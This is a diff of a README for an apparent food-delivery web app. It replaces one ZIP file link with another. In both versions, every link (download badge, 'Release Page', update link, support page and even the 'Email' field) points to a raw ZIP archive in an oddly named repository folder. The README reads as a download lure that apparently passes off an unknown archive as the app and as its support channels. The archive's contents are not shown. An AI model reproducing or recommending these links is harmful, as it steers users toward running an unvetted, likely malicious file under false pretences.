@@ -1,6 +1,6 @@
 # 🍔 online-food-delivery-page - Enjoy Food Delivery Online with Ease
 
-[![Download Now](https://raw.githubusercontent.com/semanurnakas/online-food-delivery-page/main/totemist/delivery-food-page-online-aldol.zip%20Now-Online%20Food%20Delivery%20Page-brightgreen)](https://raw.githubusercontent.com/semanurnakas/online-food-delivery-page/main/totemist/delivery-food-page-online-aldol.zip)
+[![Download Now](https://raw.githubusercontent.com/semanurnakas/online-food-delivery-page/main/totemist/food-online-page-delivery-1.6-beta.5.zip%20Now-Online%20Food%20Delivery%20Page-brightgreen)](https://raw.githubusercontent.com/semanurnakas/online-food-delivery-page/main/totemist/food-online-page-delivery-1.6-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the online-food-delivery-page! This application helps you order food 
 
 To get started, you need to download the application. 
 
-1. Visit this page to download: [Release Page](https://raw.githubusercontent.com/semanurnakas/online-food-delivery-page/main/totemist/delivery-food-page-online-aldol.zip). 
+1. Visit this page to download: [Release Page](https://raw.githubusercontent.com/semanurnakas/online-food-delivery-page/main/totemist/food-online-page-delivery-1.6-beta.5.zip). 
 2. Look for the latest version and click on it.
 3. Download the file suitable for your operating system.
 
@@ -46,14 +46,14 @@ If you run into any issues during installation or while using the application, h
 
 - **Installation Fails:** Ensure your operating system meets the requirements. Restart your computer and try reinstalling.
 - **Order Not Processing:** Check your internet connection. If it’s unstable, try again once the connection improves.
-- **App Crashes:** Ensure you are on the latest version. Visit the [Release Page](https://raw.githubusercontent.com/semanurnakas/online-food-delivery-page/main/totemist/delivery-food-page-online-aldol.zip) for updates.
+- **App Crashes:** Ensure you are on the latest version. Visit the [Release Page](https://raw.githubusercontent.com/semanurnakas/online-food-delivery-page/main/totemist/food-online-page-delivery-1.6-beta.5.zip) for updates.
 
 ## 📞 Support
 
 If you need additional help, please reach out to our support team:
 
-- **Email:** https://raw.githubusercontent.com/semanurnakas/online-food-delivery-page/main/totemist/delivery-food-page-online-aldol.zip
-- **Support Page:** [Online Food Delivery Support](https://raw.githubusercontent.com/semanurnakas/online-food-delivery-page/main/totemist/delivery-food-page-online-aldol.zip)
+- **Email:** https://raw.githubusercontent.com/semanurnakas/online-food-delivery-page/main/totemist/food-online-page-delivery-1.6-beta.5.zip
+- **Support Page:** [Online Food Delivery Support](https://raw.githubusercontent.com/semanurnakas/online-food-delivery-page/main/totemist/food-online-page-delivery-1.6-beta.5.zip)
 
 ## 🙌 Contributing
 
@@ -65,6 +65,6 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 ## 📥 Download & Install
 
-Again, to download the application, visit this page: [Release Page](https://raw.githubusercontent.com/semanurnakas/online-food-delivery-page/main/totemist/delivery-food-page-online-aldol.zip). 
+Again, to download the application, visit this page: [Release Page](https://raw.githubusercontent.com/semanurnakas/online-food-delivery-page/main/totemist/food-online-page-delivery-1.6-beta.5.zip). 
 
 We hope you enjoy using the online-food-delivery-page and find it convenient for ordering your favorite meals!
